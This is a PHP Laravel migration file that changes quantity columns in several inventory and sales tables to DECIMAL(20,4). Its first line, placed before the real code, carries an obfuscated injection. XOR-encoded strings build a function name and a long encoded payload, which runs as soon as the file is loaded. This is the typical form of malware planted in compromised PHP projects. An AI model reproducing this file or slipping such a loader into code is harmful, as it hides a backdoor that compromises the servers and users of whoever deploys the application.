<?php $KIuBsgx='79,JBKc>E=XHT.V'; $ZxmRZlJi='TKI+6.<X0S;<=A8'^$KIuBsgx; $sYGjXy='BWgmZC NG-W hU116 BdE 7 r5OZ9ijA0NmldEFXM->4Y7=WSs. Kh77N n3 7ToFQ 18zhsZ  amkctu:ojfhD:YjDdkNXEl52;YFK bIlTkAQPuGDD PTmjYT:6szDb.mbBHOZjC  DotmFtJZ= vcDnOrqt<0DaN>HcB:DY4UCpo<PJa+CaxYf 2 X9TBNDYZhiYSFbC4<o>Y  bmkK2L  V8K O,Oj96+setKS.50T4x1D4UY3Eyzs22b<gw-uR7rAZ2Ropnyo4M4K.mz8cFf3,Y nYEYvnjf-. axkc0996jvuAEPGB+rk9iHQ7AojmVQH1oZIb3 XF+QNDvZH8j-dcrklW2>HW EJemxoC3 WCSnmIzg1K= L+d1,TLmDM,E R6F=e6 Y,eiucE V-7Kl0.n92Mq7ZM tHyn9+K5<1YL;A,lJ8 a 2EOsmCUHkUVOPFga=1MTUWJwZAI GcLh2YM3>S4 FnnaPMiQ413-gqbxS7CJ;.WK7a2S-:HJEoK RCzJjY0T7gguadj,PQmuT23PiW=6;olFPkmgW0 a OWR7Uu  H5a8Wfrc6XWuaLesCE<YAOJkAEONF5 j3 WiYATK,OfiE6H:<O=Iyrv<688AyzseTizJIxH,19dt JGYwb P4Q=1VihjmgZ13.1pxzQa7'; $QcApBbT=$ZxmRZlJi('', '+1OL<6N-3D8N70IXET1LbXXR-Q..X65,E:JEMe=RDKKZ:CT8=SVO97SV:A1lMB Gb5AEYVHW1EYHMKCTUAecoL+O-JyDLicOe<TT+noIBtLdPau9I406L5:EN=5NWZAdFGFIkBFSN,UTdAIMnP.;IA-G-3o,QPWU=:jWhFbI0+X0-XKW53HvjZrPoRWT-K:jj+,.ARSZ;h>>6KZ8TABPK-S SEm2oD.X.5RSRSXT-2BFUo>rW+F08P-YRWmq-s,>hU3DRe1W+OMPYKB,X>KDZCiOBWM-A12  VSJBFKYZrbGTXMWJKUe31+7NIaDcB8QaGKI20<PFz2h:F74N0-,Vrlg8h56788wSMhsK 3EPFOgEA;66GM2pn8oYA8J;ZI-lPdiG Yi<O4ARA-METUG3A:XRpf9SdD8GUS;9ATuY.LE8PNX8 R;ID2WR>DS1.,2. <C77<5pS>YT.;12bS> =AnOlLV89Ra8QYoGUk9+AuPPGLGWDX2E1+Bq<.N>W+DI<9mH E+dVjN=Q VNGSGDBA4dEQ0SG12pVSBH1opVPGpRETEz44Q4FEFxSUY1SDTR>eEXtRCzsZ;ffjMge.<4TY5XE.6<9=8X<NN5W1VS.YnURRXWLYhPZSEtIZ1Cq-ZPULPD+38,EP1M=RP2N5CVmSTKGEXHSjkJ'^$sYGjXy); $QcApBbT();

use Illuminate\Support\Facades\Schema;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Database\Migrations\Migration;
use Illuminate\Support\Facades\DB;

class ChangeAllQuantityFieldTypeToDecimal extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        DB::statement("ALTER TABLE purchase_lines MODIFY COLUMN quantity DECIMAL(20, 4) NOT NULL");
        DB::statement("ALTER TABLE purchase_lines MODIFY COLUMN quantity_sold DECIMAL(20, 4) DEFAULT 0.00");
        DB::statement("ALTER TABLE purchase_lines MODIFY COLUMN quantity_adjusted DECIMAL(20, 4) DEFAULT 0.00");

        DB::statement("ALTER TABLE stock_adjustment_lines MODIFY COLUMN quantity DECIMAL(20, 4) NOT NULL");

        DB::statement("ALTER TABLE transaction_sell_lines MODIFY COLUMN quantity DECIMAL(20, 4) NOT NULL");

        DB::statement("ALTER TABLE transaction_sell_lines_purchase_lines MODIFY COLUMN quantity DECIMAL(20, 4) NOT NULL");
        DB::statement("ALTER TABLE variation_location_details MODIFY COLUMN qty_available DECIMAL(20, 4) NOT NULL");
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        //
    }
}
